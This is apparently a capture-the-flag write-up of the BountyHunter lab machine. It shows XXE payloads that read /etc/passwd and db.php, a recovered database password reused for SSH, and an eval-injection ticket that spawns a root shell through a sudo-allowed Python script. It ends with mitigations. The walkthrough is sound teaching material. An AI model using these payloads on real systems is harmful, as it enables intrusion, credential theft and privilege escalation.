
# BountyHunter

- Introduction
- Summary
- Walkthrough
- Mitigrations
- References


## Indroduction 

The Bountyhunter host gives a good look at the issue that can arise from the XML processing and the exploitation of custom scripts along with potently unnecessary privileges.

## Summary 

The target host was found to have three major issues. First the bur sumbitting process contained a vulnerability 

## BountyHunter

The tester started with an nmap scan to identify the host services:

```
└──╼ $nmap -p 22,80 -A 10.10.11.100 -oA BountyHunter_service
Starting Nmap 7.93 ( https://nmap.org ) at 2023-11-08 12:29 EST
Nmap scan report for 10.10.11.100
Host is up (0.056s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 d44cf5799a79a3b0f1662552c9531fe1 (RSA)
|   256 a21e67618d2f7a37a7ba3b5108e889a6 (ECDSA)
|_  256 a57516d96958504a14117a42c1b62344 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Bounty Hunters
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.21 seconds
┌─[rang3r@parrot]─[~/Projects/machines/BountyHunter]
```

The tester browsed to port 80. Browsing the web site led to the "http://10.10.11.100/log_submit.php" page which contained a service for reporting software bugs. The tester tested and discovered that the "data" parameter for the logging system is vulnerable to XML External Entity Injection which enables a user to interfere with the applications processing of xml data.

This allowed the tester to create a custom entity and reference it in the request. The service encoded the request using base64 and percent-encoding (URL), therefore the tester used the decoder feature on burp suite to encode and decode requests. To decode, requires URL then base64. To encode the request, to be sent back to the server requires the reverse, base64 then URL.


```unencoded data
<?xml  version="1.0" encoding="ISO-8859-1"?>
	<!DOCTYPE email [
 	<!ENTITY test  "This is a test">
	]>
		<bugreport>
		<title>&test;</title>
		<cwe>test</cwe>
		<cvss>test</cvss>
		<reward>test</reward>
		</bugreport>
```


```encoded data sent using curl
┌─[rang3r@parrot]─[~]
└──╼ $curl -X POST http://10.10.11.100/tracker_diRbPr00f314.php --data "data=%50%44%39%34%62%57%77%67%49%48%5a%6c%63%6e%4e%70%62%32%34%39%49%6a%45%75%4d%43%49%67%5a%57%35%6a%62%32%52%70%62%6d%63%39%49%6b%6c%54%54%79%30%34%4f%44%55%35%4c%54%45%69%50%7a%34%4b%43%54%77%68%52%45%39%44%56%46%6c%51%52%53%42%6c%62%57%46%70%62%43%42%62%43%69%41%4a%50%43%46%46%54%6c%52%4a%56%46%6b%67%64%47%56%7a%64%43%41%67%49%6c%52%6f%61%58%4d%67%61%58%4d%67%59%53%42%30%5a%58%4e%30%49%6a%34%4b%43%56%30%2b%43%67%6b%4a%50%47%4a%31%5a%33%4a%6c%63%47%39%79%64%44%34%4b%43%51%6b%38%64%47%6c%30%62%47%55%2b%4a%6e%52%6c%63%33%51%37%50%43%39%30%61%58%52%73%5a%54%34%4b%43%51%6b%38%59%33%64%6c%50%6e%52%6c%63%33%51%38%4c%32%4e%33%5a%54%34%4b%43%51%6b%38%59%33%5a%7a%63%7a%35%30%5a%58%4e%30%50%43%39%6a%64%6e%4e%7a%50%67%6f%4a%43%54%78%79%5a%58%64%68%63%6d%51%2b%64%47%56%7a%64%44%77%76%63%6d%56%33%59%58%4a%6b%50%67%6f%4a%43%54%77%76%59%6e%56%6e%63%6d%56%77%62%33%4a%30%50%67%3d%3d"
If DB were ready, would have added:
<table>
  <tr>
    <td>Title:</td>
    <td>This is a test</td>
  </tr>
  <tr>
    <td>CWE:</td>
    <td>test</td>
  </tr>
  <tr>
    <td>Score:</td>
    <td>test</td>
  </tr>
  <tr>
    <td>Reward:</td>
    <td>test</td>
  </tr>
</table>
```

You can see above that the service used referenced and printed the entity. In this case "This is a test!". This vulnerability enabled the tester to read local files using the "system" keyword to define as external reference, which was tested by viewing the passwd file using the below payload encoded.

```unencoded data 
<?xml  version="1.0" encoding="ISO-8859-1"?>
	<!DOCTYPE email [
 	<!ENTITY test SYSTEM "file:///etc/passwd">
	]>
		<bugreport>
		<title>&test;</title>
		<cwe>test</cwe>
		<cvss>test</cvss>
		<reward>test</reward>
		</bugreport>
```


```Encoded data being sent using curl.
└──╼ $curl -X POST http://10.10.11.100/tracker_diRbPr00f314.php --data "data=%50%44%39%34%62%57%77%67%49%48%5a%6c%63%6e%4e%70%62%32%34%39%49%6a%45%75%4d%43%49%67%5a%57%35%6a%62%32%52%70%62%6d%63%39%49%6b%6c%54%54%79%30%34%4f%44%55%35%4c%54%45%69%50%7a%34%4b%43%54%77%68%52%45%39%44%56%46%6c%51%52%53%42%6c%62%57%46%70%62%43%42%62%43%69%41%4a%50%43%46%46%54%6c%52%4a%56%46%6b%67%64%47%56%7a%64%43%42%54%57%56%4e%55%52%55%30%67%49%6d%5a%70%62%47%55%36%4c%79%38%76%5a%58%52%6a%4c%33%42%68%63%33%4e%33%5a%43%49%2b%43%67%6c%64%50%67%6f%4a%43%54%78%69%64%57%64%79%5a%58%42%76%63%6e%51%2b%43%67%6b%4a%50%48%52%70%64%47%78%6c%50%69%5a%30%5a%58%4e%30%4f%7a%77%76%64%47%6c%30%62%47%55%2b%43%67%6b%4a%50%47%4e%33%5a%54%35%30%5a%58%4e%30%50%43%39%6a%64%32%55%2b%43%67%6b%4a%50%47%4e%32%63%33%4d%2b%64%47%56%7a%64%44%77%76%59%33%5a%7a%63%7a%34%4b%43%51%6b%38%63%6d%56%33%59%58%4a%6b%50%6e%52%6c%63%33%51%38%4c%33%4a%6c%64%32%46%79%5a%44%34%4b%43%51%6b%38%4c%32%4a%31%5a%33%4a%6c%63%47%39%79%64%44%34%3d"
If DB were ready, would have added:
<table>
  <tr>
    <td>Title:</td>
    <td>root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
development:x:1000:1000:Development:/home/development:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
</td>
  </tr>
  <tr>
    <td>CWE:</td>
    <td>test</td>
  </tr>
  <tr>
    <td>Score:</td>
    <td>test</td>
  </tr>
  <tr>
    <td>Reward:</td>
    <td>test</td>
  </tr>
</table>

```
This showed that the service was vulnerable to local file inclusion (LFI)

The tester used the ffuf tool to discover the different web pages. Amoung others, the db.php file was found.


```
┌─[rang3r@parrot]─[~]
└──╼ $ffuf -w '/home/rang3r/Documents/SecLists-master/Discovery/Web-Content/directory-list-lowercase-2.3-small.txt' -u http://10.10.11.100/FUZZ -e .php -ic 

<snip>

resources               [Status: 301, Size: 316, Words: 20, Lines: 10, Duration: 40ms]
assets                  [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 35ms]
portal.php              [Status: 200, Size: 125, Words: 11, Lines: 6, Duration: 37ms]
css                     [Status: 301, Size: 310, Words: 20, Lines: 10, Duration: 32ms]
.php                    [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 3036ms]
db.php                  [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 34ms]
js                      [Status: 301, Size: 309, Words: 20, Lines: 10, Duration: 33ms]

<snip>
                        [Status: 200, Size: 25169, Words: 10028, Lines: 389, Duration: 34ms]
:: Progress: [163260/163260] :: Job [1/1] :: 1027 req/sec :: Duration: [0:02:34] :: Errors: 0 ::

```


The tester viewed the db.php file using a modified version of the payload. As the file was a php file it needed to be encoded in base64, as the page contains characters that break the XML format.
The tester used the php wrapper "php://filter/convert.base64-encode/" to fetch in the file and return it in base64.


```Unencoded data
<?xml  version="1.0" encoding="ISO-8859-1"?>
	<!DOCTYPE email [
 	<!ENTITY test SYSTEM "php://filter/convert.base64-encode/resource=db.php">
	]>
		<bugreport>
		<title>&test;</title>
		<cwe>test</cwe>
		<cvss>test</cvss>
		<reward>test</reward>
		</bugreport>
```


```Encoded data being sent using curl.
└──╼ $curl -X POST http://10.10.11.100/tracker_diRbPr00f314.php --data "data=%50%44%39%34%62%57%77%67%49%48%5a%6c%63%6e%4e%70%62%32%34%39%49%6a%45%75%4d%43%49%67%5a%57%35%6a%62%32%52%70%62%6d%63%39%49%6b%6c%54%54%79%30%34%4f%44%55%35%4c%54%45%69%50%7a%34%4b%43%54%77%68%52%45%39%44%56%46%6c%51%52%53%42%6c%62%57%46%70%62%43%42%62%43%69%41%4a%50%43%46%46%54%6c%52%4a%56%46%6b%67%64%47%56%7a%64%43%42%54%57%56%4e%55%52%55%30%67%49%6e%42%6f%63%44%6f%76%4c%32%5a%70%62%48%52%6c%63%69%39%6a%62%32%35%32%5a%58%4a%30%4c%6d%4a%68%63%32%55%32%4e%43%31%6c%62%6d%4e%76%5a%47%55%76%63%6d%56%7a%62%33%56%79%59%32%55%39%5a%47%49%75%63%47%68%77%49%6a%34%4b%43%56%30%2b%43%67%6b%4a%50%47%4a%31%5a%33%4a%6c%63%47%39%79%64%44%34%4b%43%51%6b%38%64%47%6c%30%62%47%55%2b%4a%6e%52%6c%63%33%51%37%50%43%39%30%61%58%52%73%5a%54%34%4b%43%51%6b%38%59%33%64%6c%50%6e%52%6c%63%33%51%38%4c%32%4e%33%5a%54%34%4b%43%51%6b%38%59%33%5a%7a%63%7a%35%30%5a%58%4e%30%50%43%39%6a%64%6e%4e%7a%50%67%6f%4a%43%54%78%79%5a%58%64%68%63%6d%51%2b%64%47%56%7a%64%44%77%76%63%6d%56%33%59%58%4a%6b%50%67%6f%4a%43%54%77%76%59%6e%56%6e%63%6d%56%77%62%33%4a%30%50%67%3d%3d"
If DB were ready, would have added:
<table>
  <tr>
    <td>Title:</td>
    <td>PD9waHAKLy8gVE9ETyAtPiBJbXBsZW1lbnQgbG9naW4gc3lzdGVtIHdpdGggdGhlIGRhdGFiYXNlLgokZGJzZXJ2ZXIgPSAibG9jYWxob3N0IjsKJGRibmFtZSA9ICJib3VudHkiOwokZGJ1c2VybmFtZSA9ICJhZG1pbiI7CiRkYnBhc3N3b3JkID0gIm0xOVJvQVUwaFA0MUExc1RzcTZLIjsKJHRlc3R1c2VyID0gInRlc3QiOwo/Pgo=</td>
  </tr>
  <tr>
    <td>CWE:</td>
    <td>test</td>
  </tr>
  <tr>
    <td>Score:</td>
    <td>test</td>
  </tr>
  <tr>
    <td>Reward:</td>
    <td>test</td>
  </tr>
</table>

```

The tester decoded the base64 to show the contents of the db.php file, obtaining a password.

```
<?php
// TODO -> Implement login system with the database.
$dbserver = "localhost";
$dbname = "bounty";
$dbusername = "admin";
$dbpassword = "m<password>K";
$testuser = "test"Owo
```

The tester used this password with the development user, found in the passwd file, to ssh into the host.

```
└──╼ $ssh development@10.10.11.100
development@10.10.11.100's password: 
Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-80-generic x86_64)

<snip>

0 updates can be applied immediately.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Mon Nov 13 16:44:20 2023 from 10.10.14.21
development@bountyhunter:~$ id
uid=1000(development) gid=1000(development) groups=1000(development)
development@bountyhunter:~$ hostname
bountyhunter
development@bountyhunter:~$ 
```

The development account is able to run the ticketValidator script as root.

```
development@bountyhunter:/opt/skytrain_inc$ sudo -l
Matching Defaults entries for development on bountyhunter:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User development may run the following commands on bountyhunter:
    (root) NOPASSWD: /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py 
development@bountyhunter:/opt/skytrain_inc$ 

```

The Tester investigated the code and found user input gets passed into the "eval" function. This function evaluates python statments therefore can be used to execute commands. The first 32 lines of code deals with the layout of the ticket, ensuring the ticket is in the right format. This can be bypassed by copying the first 3 lines of the invalid ticket from the "invalid_tickets" folder. These lines are:

```
# Skytrain Inc
## Ticket to Bridgeport
__Ticket Code:__
```

The 33th line of code is what needs to be looked at, it requires the remainder of the sum of the ticket code to be 4. The Tester used the payload:

```
**18+__import__('os').system('bash')**
```

The asterisk sysmbols are removed by the script. Next is the 18. This, after using the modulo operator against 7 will have a remainder of 4, which will clear the scripts check on line 33 of the script. The rest of the payload simply imports the "os" module and calls the function system to execute the bash command. This will spawn a root shell in the middle of the script running process.


```The ticket that will spawn a bash shell.
# Skytrain Inc
## Ticket to Bridgeport
__Ticket Code:__
**18+__import__('os').system('bash')**
##Issued: 2021/06/21
#End Ticket
```

The Tester ran the script and entered the ticket location and gained a root shell.

```
development@bountyhunter:/opt/skytrain_inc$ sudo /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py
Please enter the path to the ticket file.
/tmp/special_ticket.md
Destination: Bridgeport
root@bountyhunter:/opt/skytrain_inc# id
uid=0(root) gid=0(root) groups=0(root)
root@bountyhunter:/opt/skytrain_inc# hostname
bountyhunter
root@bountyhunter:/opt/skytrain_inc# 
```



## Mitigations 

- Avoid outdated functions and libraries
- Disable referencing custom Document Type Definitions (DTDs)
- Disable referencing External XML Entities
- Disable Parameter Entity processing
- Disable support for XInclude
- Prevent Entity Reference Loops
- Disable displaying errors


## References

https://portswigger.net/web-security/xxe
https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html




